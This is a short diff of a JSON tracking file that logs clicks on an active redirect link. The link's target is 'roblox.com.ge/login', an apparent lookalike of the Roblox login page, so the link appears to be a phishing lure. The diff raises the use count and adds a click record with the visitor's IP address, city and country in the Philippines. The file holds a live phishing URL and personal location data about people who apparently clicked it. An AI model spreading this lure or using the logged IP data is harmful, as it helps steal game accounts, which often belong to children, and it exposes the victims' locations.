@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1410,
+    "useCount": 1411,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11446,6 +11446,14 @@
         "ip": "136.239.224.76",
         "country": "Philippines",
         "city": "Suyo",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777427620672,
+        "ip": "136.239.180.40",
+        "country": "Philippines",
+        "city": "Calamba",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
